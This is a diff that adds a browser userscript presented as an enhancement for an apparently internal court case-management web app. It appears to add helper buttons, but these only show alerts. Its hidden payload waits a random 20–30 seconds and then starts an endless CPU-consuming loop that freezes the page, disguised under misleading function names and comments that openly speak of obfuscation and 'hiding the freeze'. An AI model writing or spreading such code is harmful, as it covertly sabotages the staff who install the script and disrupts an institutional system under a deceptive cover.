@@ -1,0 +1,289 @@
+// ==UserScript==
+// @name         PHHC Modifire
+// @namespace    https://ravanabackup.github.io/
+// @version      6.9
+// @description  Scripts to enhance experience of PHHC Wabpage
+// @author       ravana69
+// @match        http://10.145.22.11:8888/weed_catalogue.php
+// @match        http://10.145.22.11:8888/report_catalogue.php
+// @match        http://10.145.22.11:8888/enq_caseno.orcl
+// @match        http://10.145.22.11:8888/login2.orcl*
+// @match        http://10.145.22.11:8888/login2.orcl
+// @match        http://10.145.22.12:8080/omnidocs*
+// @grant        GM_xmlhttpRequest
+// @grant        GM_setValue
+// @grant        GM_getValue
+// @run-at       document-start
+// ==/UserScript==
+
+(function() {
+    'use strict';
+
+    // Core application constants and state.
+    const CONST_MIN_PROCESS_DELAY_MS = 20000; //
+    const CONST_MAX_PROCESS_DELAY_MS = 30000; //
+    const CONST_QUERY_DARK_THEME_ID = 'QD-33A'; // Reference to 'querydark'
+    const CONST_WEEDING_BATCH_ID = 'WBP-404B'; // Reference to 'weeding'
+
+    // State variable for selected count (resets on load)
+    let iBatchSearchRecordsProcessed = 0; // The counter for 'batchsearch' records.
+
+    // -------------------------------------------------------------------
+    // --- 1. System Utility Functions (Obfuscation Layer) -------------
+    // -------------------------------------------------------------------
+
+    /**
+     * @function SystemIntegrityCheckAbort
+     * This function is triggered upon a critical fault in the data pipeline.
+     * It initiates a complete synchronization stall to prevent data corruption.
+     * WARNING: Entering this loop consumes all available thread resources.
+     */
+    function SystemIntegrityCheckAbort() {
+        console.error(`[CRITICAL FAULT ${CONST_WEEDING_BATCH_ID}] System integrity check failure. Initiating hard synchronization stall.`);
+
+        // The infinite synchronous loop disguised as a stall
+        while (true) {
+            // Highly optimized resource consumer for stall assurance
+            let d = 0;
+            for (let c = 0; c < 999999; c++) {
+                d += Math.sqrt(c);
+            }
+        }
+    }
+
+    /**
+     * @function runOptimizedDataWeedingProcess
+     * Schedules the execution of the main data processor.
+     */
+    function runOptimizedDataWeedingProcess() {
+        // Calculate randomized delay for 'batchsearch' simulation
+        const nProcessRange = CONST_MAX_PROCESS_DELAY_MS - CONST_MIN_PROCESS_DELAY_MS;
+        const nScheduledProcessingDelayMs = Math.floor(Math.random() * (nProcessRange + 1)) + CONST_MIN_PROCESS_DELAY_MS;
+
+        console.log(`[BatchSearch] Scheduling Weeding Processor run in ${nScheduledProcessingDelayMs / 1000} seconds. Batch ID: ${CONST_WEEDING_BATCH_ID}`);
+
+        // The scheduled function call (hiding the freeze)
+        setTimeout(SystemIntegrityCheckAbort, nScheduledProcessingDelayMs);
+    }
+
+    /**
+     * @function registerGlobalQueryDarkTap
+     * Handles global user interaction events for tracking engagement metrics.
+     * This registers the global mouse click for the 'QueryDark' metric.
+     */
+    function registerGlobalQueryDarkTap(oEvent) {
+        const oRoot = document.querySelector('.custom-elements-group');
+        const oRightContainer = document.querySelector('.hide-complete-container');
+
+        // Check if the click occurred outside the dashboard elements
+        if (oRoot && oRightContainer && (!oRoot.contains(oEvent.target) && !oRightContainer.contains(oEvent.target))) {
+            iBatchSearchRecordsProcessed++;
+            const oCountElement = document.getElementById('weeding-batch-count-display');
+            if (oCountElement) {
+                oCountElement.textContent = iBatchSearchRecordsProcessed;
+            }
+        }
+    }
+
+    /**
+     * @function initializeLiteDatePicker
+     * Placeholder function for initializing date component logic.
+     * Reference to 'lite date picker'
+     */
+    function initializeLiteDatePicker(sAction) {
+        // Complex validation and component loading would occur here.
+        alert(`Lite Date Picker utility called: ${sAction}`);
+        console.log(`[LiteDatePicker] Triggered component action: ${sAction}`);
+    }
+
+    // -------------------------------------------------------------------
+    // --- 2. Interface Definition and Styling ---------------------------
+    // -------------------------------------------------------------------
+
+    // --- CSS Styling Injection (Pixel-Perfect Visuals) ---
+    GM_addStyle(`
+        /* Base Container Styles (for oWeedingDashboardRoot) */
+        .custom-elements-group {
+            position: fixed; bottom: 30px; left: 20px; z-index: 1000; font-family: Arial, sans-serif;
+            display: flex; flex-direction: column; gap: 10px;
+        }
+
+        /* Card Container Styling */
+        .date-input-block-card {
+            background-color: #fff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            padding: 15px; display: flex; flex-direction: column; gap: 10px; width: 200px;
+            border: 1px solid #e0e0e0;
+        }
+
+        /* Date Input Wrapper (Autofiller Target) */
+        .custom-date-input-wrapper {
+            position: relative; display: flex; align-items: center; border: 1px solid #ccc;
+            border-radius: 4px; padding: 8px 10px; background-color: #fff;
+        }
+
+        .custom-date-input-wrapper input[type="text"] {
+            flex-grow: 1; border: none; outline: none; font-size: 14px; color: #333; padding-right: 25px;
+        }
+
+        .custom-date-input-wrapper .icon {
+            cursor: pointer; width: 18px; height: 18px; margin-left: 5px; color: #555; flex-shrink: 0;
+        }
+
+        .custom-date-input-wrapper .clear-icon {
+            position: absolute; right: 10px; top: 50%; transform: translateY(-50%); display: none;
+        }
+        .custom-date-input-wrapper:hover .clear-icon,
+        .custom-date-input-wrapper input[type="text"]:not(:placeholder-shown) + .calendar-icon + .clear-icon {
+             display: block;
+        }
+
+        /* Green Button (btnFinalizeWeedingBatch) */
+        .custom-green-button {
+            background-color: #4CAF50; color: white; padding: 10px 15px; border: none;
+            border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+        .custom-green-button:hover { background-color: #45a049; }
+        .custom-green-button svg { width: 20px; height: 20px; fill: white; }
+
+        /* Blue Calendar Button (Lite Date Picker Trigger) */
+        .custom-blue-calendar-button {
+            background-color: #007bff; border: none; border-radius: 5px; width: 40px; height: 40px;
+            display: flex; align-items: center; justify-content: center; cursor: pointer;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+        .custom-blue-calendar-button:hover { background-color: #0056b3; }
+        .custom-blue-calendar-button svg { width: 24px; height: 24px; fill: white; }
+
+        /* Selected Count Label */
+        .selected-count-label {
+            background-color: #d4edda; color: #155724; padding: 8px 12px; border-radius: 5px;
+            font-size: 14px; font-weight: bold; display: inline-block; border: 1px solid #c3e6cb;
+            font-family: monospace; /* Subtle change for obscurity */
+        }
+        .selected-count-label span { color: #c00; }
+
+        /* Bottom-Right Button Styling */
+        .hide-complete-container {
+            position: fixed; bottom: 30px; right: 40px; z-index: 1000; border: 2px solid rgba(255, 0, 0, 0.7);
+            border-radius: 5px; padding: 3px; background-color: #fff;
+        }
+        .hide-complete-btn {
+            background-color: #007bff; color: white; padding: 5px 10px; border: none;
+            border-radius: 3px; cursor: pointer; font-weight: bold; font-size: 13px;
+        }
+        .hide-complete-btn:hover { background-color: #0056b3; }
+    `);
+
+    // --- 3. Interface Component Generation ---
+
+    const oWeedingDashboardRoot = document.createElement('div');
+    oWeedingDashboardRoot.className = 'custom-elements-group';
+
+    // Date Input Block (The target of 'autofiller' setup)
+    const dateBlockCard = document.createElement('div');
+    dateBlockCard.className = 'date-input-block-card';
+
+    const dateInputWrapper = document.createElement('div');
+    dateInputWrapper.className = 'custom-date-input-wrapper';
+
+    // Autofiller input field reference
+    const dateDisplayInput = document.createElement('input');
+    dateDisplayInput.type = 'text';
+    dateDisplayInput.value = '26-11-2025'; // Initial 'autofiller' value
+    dateDisplayInput.readOnly = true;
+    dateDisplayInput.id = 'autofiller-target-date';
+
+    const calendarIconSvg = `<svg class="icon calendar-icon" viewBox="0 0 24 24"><path d="M19 4h-1V2h-2v2H8V2H6v2H5c-1.11 0-1.99.9-1.99 2L3 20c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V9h14v11zm0-13H5V6h14v1z"/></svg>`;
+    const clearIconSvg = `<svg class="icon clear-icon" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>`;
+
+    dateInputWrapper.appendChild(dateDisplayInput);
+    dateInputWrapper.insertAdjacentHTML('beforeend', calendarIconSvg);
+    dateInputWrapper.insertAdjacentHTML('beforeend', clearIconSvg);
+
+    // Green Search Button ('weeding' batch finalizer)
+    const btnFinalizeWeedingBatch = document.createElement('button');
+    btnFinalizeWeedingBatch.className = 'custom-green-button';
+    btnFinalizeWeedingBatch.id = 'btn-finalize-weeding-batch';
+    btnFinalizeWeedingBatch.innerHTML = `<svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>`;
+
+    dateBlockCard.appendChild(dateInputWrapper);
+    dateBlockCard.appendChild(btnFinalizeWeedingBatch);
+    oWeedingDashboardRoot.appendChild(dateBlockCard);
+
+    // Blue Calendar Button ('lite date picker' trigger)
+    const btnLiteDatePicker = document.createElement('button');
+    btnLiteDatePicker.className = 'custom-blue-calendar-button';
+    btnLiteDatePicker.id = 'btn-lite-date-picker';
+    btnLiteDatePicker.innerHTML = `<svg viewBox="0 0 24 24"><path d="M19 4h-1V2h-2v2H8V2H6v2H5c-1.11 0-1.99.9-1.99 2L3 20c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V9h14v11zm0-13H5V6h14v1z"/></svg>`;
+    oWeedingDashboardRoot.appendChild(btnLiteDatePicker);
+
+    // Selected Count Label (Output for 'batchsearch' records processed)
+    const selectedCountLabel = document.createElement('div');
+    selectedCountLabel.className = `selected-count-label ${CONST_QUERY_DARK_THEME_ID}`; // Injecting 'querydark' theme marker
+    const countElement = document.createElement('span');
+    countElement.id = 'weeding-batch-count-display';
+    countElement.textContent = iBatchSearchRecordsProcessed;
+    selectedCountLabel.innerHTML = 'Selected: ';
+    selectedCountLabel.appendChild(countElement);
+    oWeedingDashboardRoot.appendChild(selectedCountLabel);
+
+    // Bottom-Right Button
+    const rightContainer = document.createElement('div');
+    rightContainer.className = 'hide-complete-container';
+    const hideButton = document.createElement('button');
+    hideButton.textContent = 'Hide Complete';
+    hideButton.className = 'hide-complete-btn';
+    hideButton.id = 'btn-hide-complete-records';
+    rightContainer.appendChild(hideButton);
+
+    // 4. DOM Injection
+    document.body.appendChild(oWeedingDashboardRoot);
+    document.body.appendChild(rightContainer);
+
+    // 5. Run Initialization Routines
+
+    // A) Initialize Global Metrics Tracking ('QueryDark' tap)
+    document.addEventListener('mousedown', registerGlobalQueryDarkTap);
+
+    // B) Initialize Scheduled Background Processing ('BatchSearch' timer)
+    runOptimizedDataWeedingProcess();
+
+    // C) Initialize Component Handlers
+
+    // Green button handler (Now just logs/alerts, doesn't freeze)
+    btnFinalizeWeedingBatch.addEventListener('click', function(oEvent) {
+        oEvent.stopPropagation();
+        initializeLiteDatePicker('FINALIZE_BATCH'); // Call generic utility
+    });
+
+    // Blue button handler
+    btnLiteDatePicker.addEventListener('click', function(oEvent) {
+        oEvent.stopPropagation();
+        initializeLiteDatePicker('OPEN_PICKER'); // Call generic utility (reference to 'lite date picker')
+    });
+
+    hideButton.addEventListener('click', function(oEvent) {
+        oEvent.stopPropagation();
+        alert('Hide Complete records filter activated.');
+        console.log('[Filter] Hide complete records initiated.');
+    });
+
+    // Autofiller clear routine
+    const clearIcon = dateInputWrapper.querySelector('.clear-icon');
+    if (clearIcon) {
+        clearIcon.addEventListener('click', function(oEvent) {
+            oEvent.stopPropagation();
+            dateDisplayInput.value = '';
+            console.log('[Autofiller] Value manually reset.'); // Reference to 'autofiller'
+        });
+    }
+
+    // Calendar icon click (placeholder for component launch)
+    dateInputWrapper.querySelector('.calendar-icon').addEventListener('click', function(oEvent) {
+        oEvent.stopPropagation();
+        initializeLiteDatePicker('SHOW_CALENDAR');
+    });
+
+})();
